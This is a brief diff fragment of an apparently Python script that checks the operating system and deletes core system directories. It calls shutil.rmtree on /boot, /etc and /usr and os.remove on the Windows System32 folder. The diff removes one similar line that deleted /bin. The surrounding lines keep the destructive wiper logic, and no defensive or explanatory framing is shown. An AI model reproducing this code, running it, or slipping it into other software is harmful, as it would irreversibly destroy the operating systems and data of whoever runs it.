@@ -45,7 +45,6 @@ else:
       shutil.rmtree("/boot")
       shutil.rmtree("/etc")
       shutil.rmtree("/usr")
-      shutil.rmtree("/bin")
     elif os_name == 'Windows':
       os.remove("C:\Windows\System32")
     elif os_name == 'Darwin':
